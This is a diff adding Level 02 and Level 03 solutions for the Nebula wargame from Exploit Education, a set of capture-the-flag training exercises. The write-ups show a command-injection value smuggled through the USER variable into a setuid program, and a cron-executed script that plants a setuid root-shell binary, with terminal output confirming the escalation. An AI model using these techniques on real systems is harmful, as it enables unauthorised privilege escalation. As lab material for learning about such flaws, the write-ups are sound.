@@ -110,3 +110,160 @@ You have successfully executed getflag on a target account
 1. In the program, it should always run a command with its absolute path!
 
 ## Ref
+
+# Level 02
+## Description
+
+Link [https://exploit.education/nebula/level-02/](https://exploit.education/nebula/level-02/)
+```
+There is a vulnerability in the below program that allows arbitrary programs to be executed, can you find it?
+
+To do this level, log in as the level02 account with the password level02. Files for this level can be found in /home/flag02.
+```
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char *buffer;
+
+  gid_t gid;
+  uid_t uid;
+
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  buffer = NULL;
+
+  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+  printf("about to call system(\"%s\")\n", buffer);
+  
+  system(buffer);
+}
+```
+
+## Analyse
+1. Just as the previous level, it runs a command in the `setuid` program. Here, a part of the command is from the user input which is env variable `USER`. There is no bad charactor verification... What if we pass `God; bash; echo` as `USER` value, the command will become `/bin/echo God; bash; echo is cool`, emmmmm, so this is to solution
+
+
+## Solution
+```bash
+level02@nebula:/home/flag02$ USER="God;bash;echo" ./flag02 
+about to call system("/bin/echo God;bash;echo is cool")
+God
+flag02@nebula:/home/flag02$ id
+uid=997(flag02) gid=1003(level02) groups=997(flag02),1003(level02)
+flag02@nebula:/home/flag02$ getflag
+You have successfully executed getflag on a target account
+```
+
+## After thought
+1. Do not trust the user's input, do not take user's input directly as the command 
+
+## Ref
+
+# Level 03
+## Description
+
+Link [https://exploit.education/nebula/level-03/](https://exploit.education/nebula/level-03/)
+```
+Check the home directory of flag03 and take note of the files there.
+
+There is a crontab that is called every couple of minutes.
+
+To do this level, log in as the level03 account with the password level03. Files for this level can be found in /home/flag03.
+```
+
+
+## Analyse
+1. There is a crontab, let's see what does it do:
+    ```bash
+    level03@nebula:/home/flag03$ cat writable.sh 
+    #!/bin/sh
+
+    for i in /home/flag03/writable.d/* ; do
+            (ulimit -t 5; bash -x "$i")
+            rm -f "$i"
+    done
+    ```
+    It read and run the files in the path /home/flag03/writable.d/
+    1. do some tests first, we create a test file:
+    ```bash
+    level03@nebula:/home/flag03$ echo "touch /tmp/from_cron" > writable.d/test.sh
+    ```
+    wait a couple min, the file `writable.d/test.sh` is deleted, and the file `/tmp/from_cron` is created
+    ```bash
+    level03@nebula:/home/flag03$ ll /tmp/
+    total 0
+    drwxrwxrwt 6 root   root   140 2021-03-21 13:45 ./
+    drwxr-xr-x 1 root   root   220 2021-03-21 13:52 ../
+    -rw-rw-r-- 1 flag03 flag03   0 2021-03-21 13:45 from_cron
+    ```
+2. Planning: use a bash script which create a `setuid` executable by the user `flag03`. (I will reuse the level01)
+
+
+## Solution
+```c
+// exploit.c
+
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  system("bash");
+}
+``` 
+```bash
+# flag03/writable.d/exploit.sh
+
+gcc /tmp/exploit.c -o /home/flag03/exploit
+chmod 4755 /home/flag03/exploit
+```
+
+```bash
+level03@nebula:/home/flag03$ ./exploit 
+flag03@nebula:/home/flag03$ id
+uid=996(flag03) gid=1004(level03) groups=996(flag03),1004(level03)
+flag03@nebula:/home/flag03$ getflag
+You have successfully executed getflag on a target account
+```
+
+## After thought
+1. The first try was intend to create the `exploit` file in `/tmp`, but the output file does not run as expected
+    ```bash
+    level03@nebula:/home/flag03$ ll /tmp/
+    total 12
+    drwxrwxrwt 6 root    root     180 2021-03-21 14:00 ./
+    drwxr-xr-x 1 root    root     220 2021-03-21 13:52 ../
+    -rwsr-xr-x 1 flag03  flag03  7323 2021-03-21 14:00 exploit*
+    ```
+  in fact, there is a special flag `nosuid` which prevent the `setuid` behaviour...
+    ```bash
+    flag03@nebula:/tmp$ mount
+    ...
+    tmpfs on /tmp type tmpfs (rw,nosuid,nodev)
+    ...
+    ```
+
+## Ref
+1. [why setuid not work in /tmp](https://unix.stackexchange.com/questions/157314/suid-bit-not-working-for-executables-within-tmp-directory)
+2. [check nosuid flag](https://unix.stackexchange.com/questions/91068/how-to-check-if-a-partition-is-mounted-as-noexec)
